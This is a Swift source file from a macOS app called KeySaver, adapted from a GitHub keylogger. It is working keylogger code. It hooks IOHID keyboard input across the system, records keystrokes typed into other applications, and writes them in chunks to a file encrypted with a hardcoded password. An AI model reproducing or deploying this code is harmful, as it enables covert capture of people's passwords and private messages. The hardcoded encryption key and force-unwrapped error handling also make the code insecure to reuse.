//
//  LoggerCallback.swift
//  KeySaver
//
//  Created by Etienne Beaulac on 5/2/19.
//  Copyright © 2019 Etienne Beaulac. All rights reserved.
//  Inspired by Skrew Everything's GitHub for keylogger
//

import Foundation
import Cocoa

class LoggerCallback
{
    static var PASSWORD = "this-is-the-PASSWORD-for-KeySaver1"
    static var CAPSLOCK = false
    static var SHIFT = false
    static var calander = Calendar.current
    //    static var prev = ""
    static var command = false
    
    static var text = ""
    
    static func encrypt(text: String, toFile file: URL) {
        if var fileContents = NSData.init(contentsOf: file) as Data? {
            if (!fileContents.isEmpty) {
                fileContents = try! RNCryptor.decrypt(data: fileContents as Data, withPassword: LoggerCallback.PASSWORD)
            }
            let newText = text.data(using: .utf8)!
            fileContents.append(newText)
            let ciphertext = RNCryptor.encrypt(data: fileContents as Data, withPassword: LoggerCallback.PASSWORD)
            try! FileManager.default.removeItem(atPath: file.path)
            if !FileManager.default.createFile(atPath: file.path, contents: nil, attributes: nil) {
                print("Can't Create File")
            }
            let fhs = FileHandle.init(forWritingAtPath: file.path)
            fhs?.seekToEndOfFile()
            fhs?.write(ciphertext)
        } else {
            let newText = text.data(using: .utf8)!
            let ciphertext = RNCryptor.encrypt(data: newText as Data, withPassword: LoggerCallback.PASSWORD)
            let fhs = FileHandle.init(forWritingAtPath: file.path)
            fhs?.seekToEndOfFile()
            fhs?.write(ciphertext)
        }
    }
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let this = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let element: IOHIDElement = IOHIDValueGetElement(device);
        //        var test: Bool
        if IOHIDElementGetUsagePage(element) != 0x07 || this.appName == "KeySaver" {
            return
        }
        let code = IOHIDElementGetUsage(element);
        if (code < 4 || code > 231) {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device);
        //        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        //        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
        //        if !FileManager.default.fileExists(atPath: path.path)
        //        {
        //            do
        //            {
        //                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
        //            }
        //            catch
        //            {
        //                print("Can't Create Folder")
        //            }
        //        }
        //            test = false
        //        }
        //        else
        //        {
        //            test = true
        //            CallbackFunctions.prev = fileName
        //        }

        //        if test
        //        {
        //            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
        //            fh?.write(timeStamp.data(using: .utf8)!)
        //        }
        
        Outside:if pressed == 1 { // keydown
            if code == 57 { // Capslock
                LoggerCallback.CAPSLOCK = !LoggerCallback.CAPSLOCK
                break Outside
            }
            if code >= 58 && code <= 83 || code == 41 || code == 42 {
                break Outside
            }
            if code == 225 { // Shift
                LoggerCallback.SHIFT = true
                break Outside
            }
            if code >= 224 && code <= 231 || command {
                command = true
                //                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                break Outside
            }
            if LoggerCallback.CAPSLOCK || LoggerCallback.SHIFT { // Show uppercase
                text += this.keyMap[code]![1]
            } else { // Show lowercase
                text += this.keyMap[code]![0]
            }
            if (text.count == 10) {
                LoggerCallback.encrypt(text: text, toFile: Keylogger.filenameUrl)
                text = ""
            }
        } else { // keyup
            if code == 225 { // no more shift
                LoggerCallback.SHIFT = false
                break Outside
            }
            if code >= 224 && code <= 231 { // no more special keys
                command = false
            }
        }
    }
}
